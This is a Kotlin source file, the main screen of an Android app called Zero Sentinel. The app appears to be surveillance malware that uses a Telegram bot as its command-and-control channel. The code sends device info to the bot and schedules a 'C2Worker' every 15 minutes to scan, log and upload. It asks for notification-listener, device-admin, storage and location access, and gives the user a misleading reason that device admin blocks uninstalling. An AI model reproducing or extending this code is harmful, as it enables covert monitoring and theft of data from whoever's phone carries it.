package com.zero.sentinel.ui

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.Gravity
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.GravityCompat
import androidx.drawerlayout.widget.DrawerLayout
import androidx.work.*
import com.google.android.material.navigation.NavigationView
import com.zero.sentinel.R
import com.zero.sentinel.data.EncryptedPrefsManager
import com.zero.sentinel.network.GithubUpdater
import com.zero.sentinel.network.TelegramClient
import com.zero.sentinel.utils.DeviceInfoHelper
import com.zero.sentinel.workers.C2Worker
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var drawerLayout: DrawerLayout
    private lateinit var navigationView: NavigationView
    private lateinit var btnMenu: android.widget.ImageView
    private lateinit var iconStatus: android.widget.ImageView
    
    private lateinit var etBotToken: EditText
    private lateinit var etChatId: EditText
    private lateinit var btnTest: android.widget.Button
    private lateinit var btnSave: android.widget.Button
    
    private lateinit var prefsManager: EncryptedPrefsManager

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        prefsManager = EncryptedPrefsManager(this)
        
        initViews()
        setupDrawer()
        setupListeners()
        loadCredentials()
        
        // Auto-start stuff
        checkAndStartService()
        schedulePeriodicWork()
    }

    private fun initViews() {
        drawerLayout = findViewById(R.id.drawer_layout)
        navigationView = findViewById(R.id.nav_view)
        btnMenu = findViewById(R.id.btn_menu)
        iconStatus = findViewById(R.id.icon_status)
        
        etBotToken = findViewById(R.id.et_bot_token)
        etChatId = findViewById(R.id.et_chat_id)
        btnTest = findViewById(R.id.btn_test)
        btnSave = findViewById(R.id.btn_save)
    }

    private fun setupDrawer() {
        btnMenu.setOnClickListener {
            drawerLayout.openDrawer(GravityCompat.START)
        }

        // Set version text in header
        val headerView = navigationView.getHeaderView(0)
        val tvVersion = headerView.findViewById<TextView>(R.id.tv_version)
        try {
            val versionName = packageManager.getPackageInfo(packageName, 0).versionName
            tvVersion.text = "v$versionName"
        } catch (e: Exception) {
            tvVersion.text = "v?.?.?"
        }

        navigationView.setNavigationItemSelectedListener { menuItem ->
            when (menuItem.itemId) {
                R.id.nav_dashboard -> {
                    drawerLayout.closeDrawer(GravityCompat.START)
                }
                R.id.nav_security -> {
                    drawerLayout.closeDrawer(GravityCompat.START)
                    showSetPinDialog()
                }
                R.id.nav_update -> {
                    drawerLayout.closeDrawer(GravityCompat.START)
                    Toast.makeText(this, "Checking for updates...", Toast.LENGTH_SHORT).show()
                    CoroutineScope(Dispatchers.IO).launch {
                        GithubUpdater(this@MainActivity).checkAndInstallUpdate()
                    }
                }
                R.id.nav_settings -> {
                    drawerLayout.closeDrawer(GravityCompat.START)
                    showPermissionsDialog()
                }
            }
            true
        }
    }

    private fun setupListeners() {
        // Save
        btnSave.setOnClickListener {
            saveCredentials()
            schedulePeriodicWork() // Reschedule with new creds potentially
        }

        // Test
        btnTest.setOnClickListener {
            performFullSystemTest()
        }
    }

    private fun loadCredentials() {
        etBotToken.setText(prefsManager.getBotToken())
        etChatId.setText(prefsManager.getChatId())
    }

    private fun saveCredentials() {
        val token = etBotToken.text.toString().trim()
        val chat = etChatId.text.toString().trim()

        if (token.isNotEmpty() && chat.isNotEmpty()) {
            prefsManager.saveBotToken(token)
            prefsManager.saveChatId(chat)
            Toast.makeText(this, "Credentials Saved ✅", Toast.LENGTH_SHORT).show()
            updateStatusIcon(true)
        } else {
            Toast.makeText(this, "Please enter Token and Chat ID", Toast.LENGTH_SHORT).show()
            updateStatusIcon(false)
        }
    }

    private fun updateStatusIcon(active: Boolean) {
        if (active) {
            iconStatus.setColorFilter(androidx.core.content.ContextCompat.getColor(this, R.color.success_green))
        } else {
             iconStatus.setColorFilter(androidx.core.content.ContextCompat.getColor(this, R.color.indigo_accent))
        }
    }

    private fun performFullSystemTest() {
        val token = etBotToken.text.toString().trim()
        val chat = etChatId.text.toString().trim()

        if (token.isEmpty() || chat.isEmpty()) {
            Toast.makeText(this, "Credentials required for test", Toast.LENGTH_SHORT).show()
            return
        }

        // Save first to ensure workers use latest
        prefsManager.saveBotToken(token)
        prefsManager.saveChatId(chat)

        Toast.makeText(this, "🔄 Starting System Test...", Toast.LENGTH_SHORT).show()
        
        CoroutineScope(Dispatchers.IO).launch {
            val client = TelegramClient(this@MainActivity)
            
            // 1. Verify Token
            val botUser = client.testToken()
            if (botUser == null) {
                withContext(Dispatchers.Main) {
                    Toast.makeText(this@MainActivity, "❌ Token Invalid", Toast.LENGTH_LONG).show()
                }
                return@launch
            }

            // 2. Send Device Info
            val deviceInfo = DeviceInfoHelper.getDeviceInfo(this@MainActivity)
            client.sendMessage("🔔 *TEST CONNECTION*\n\n$deviceInfo")
            client.setMyCommands()

            withContext(Dispatchers.Main) {
                 Toast.makeText(this@MainActivity, "✅ Token OK. Info Sent.", Toast.LENGTH_SHORT).show()
                 // 3. Trigger C2 Cycle (Scan -> Log -> Upload)
                 triggerOneTimeC2()
            }
        }
    }

    private fun triggerOneTimeC2() {
        val request = OneTimeWorkRequest.Builder(C2Worker::class.java).build()
        WorkManager.getInstance(this).enqueue(request)
        
        WorkManager.getInstance(this).getWorkInfoByIdLiveData(request.id).observe(this) { workInfo ->
             if (workInfo != null) {
                 when (workInfo.state) {
                     WorkInfo.State.SUCCEEDED -> {
                         Toast.makeText(this, "✅ C2 Cycle (Scan/Upload) Complete!", Toast.LENGTH_LONG).show()
                         updateStatusIcon(true)
                     }
                     WorkInfo.State.FAILED -> {
                         Toast.makeText(this, "❌ C2 Cycle Failed", Toast.LENGTH_LONG).show()
                         updateStatusIcon(false)
                     }
                     WorkInfo.State.RUNNING -> {
                         // Optional: Show loading indicator
                     }
                     else -> {}
                 }
             }
        }
    }

    private fun schedulePeriodicWork() {
        val workRequest = PeriodicWorkRequestBuilder<C2Worker>(15, TimeUnit.MINUTES)
            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
            .build()
        
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "SentinelC2",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    private fun checkAndStartService() {
        // Basic check if service is needed or already running logic could go here
        // For now, we rely on WorkManager for the heavy lifting as per Phase 4
    }

    // --- Dialogs ---

    private fun showSetPinDialog() {
        val dialogView = layoutInflater.inflate(R.layout.dialog_set_pin, null)
        val etPinNew = dialogView.findViewById<EditText>(R.id.et_pin_new)
        val etPinConfirm = dialogView.findViewById<EditText>(R.id.et_pin_confirm)

        AlertDialog.Builder(this, R.style.Theme_ZeroSentinel_Dialog)
            .setView(dialogView)
            .setPositiveButton(R.string.pin_dialog_save) { _, _ ->
                val p1 = etPinNew.text.toString()
                val p2 = etPinConfirm.text.toString()
                if (p1.length == 6 && p1 == p2) {
                    prefsManager.saveAppPassword(p1)
                    Toast.makeText(this, "PIN Updated ✅", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "Mismatch or Invalid length", Toast.LENGTH_SHORT).show()
                }
            }
            .setNegativeButton(R.string.pin_dialog_cancel, null)
            .show()
    }

    private fun showPermissionsDialog() {
        val items = arrayOf(
            "Notification Access: ${if(isNotificationServiceEnabled()) "✅" else "❌"}",
            "Battery Optimization: ${if(isIgnoringBatteryOptimizations()) "✅" else "❌"}",
            "Admin Privileges: ${if(isAdminActive()) "✅" else "❌"}",
            "Storage/Camera: ${if(hasMediaPermissions()) "✅" else "❌"}"
        )

        AlertDialog.Builder(this, R.style.Theme_ZeroSentinel_Dialog)
            .setTitle("System Permissions")
            .setItems(items) { _, which ->
                 when(which) {
                     0 -> requestNotificationAccess()
                     1 -> requestBatteryOptimization()
                     2 -> requestAdmin()
                     3 -> requestMediaPermissions()
                 }
            }
            .setPositiveButton("Close", null)
            .show()
    }

    // --- Permission Helpers ---

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }
    
    private fun requestNotificationAccess() {
        startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    @android.annotation.SuppressLint("BatteryLife")
    private fun requestBatteryOptimization() {
        if (!isIgnoringBatteryOptimizations()) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        }
    }
    
    private fun isAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val cn = android.content.ComponentName(this, com.zero.sentinel.receivers.SentinelDeviceAdminReceiver::class.java)
        return dpm.isAdminActive(cn)
    }
    
    private fun requestAdmin() {
        val cn = android.content.ComponentName(this, com.zero.sentinel.receivers.SentinelDeviceAdminReceiver::class.java)
        val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, cn)
        intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Protects the app from unauthorized uninstallation.")
        startActivity(intent)
    }

    private fun hasMediaPermissions(): Boolean {
        return if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            checkSelfPermission(android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
        } else {
            checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED
        }
    }
    
    private fun requestMediaPermissions() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            requestPermissions(arrayOf(android.Manifest.permission.READ_MEDIA_IMAGES, android.Manifest.permission.ACCESS_FINE_LOCATION), 101)
        } else {
            requestPermissions(arrayOf(android.Manifest.permission.READ_EXTERNAL_STORAGE, android.Manifest.permission.ACCESS_FINE_LOCATION), 101)
        }
    }
}
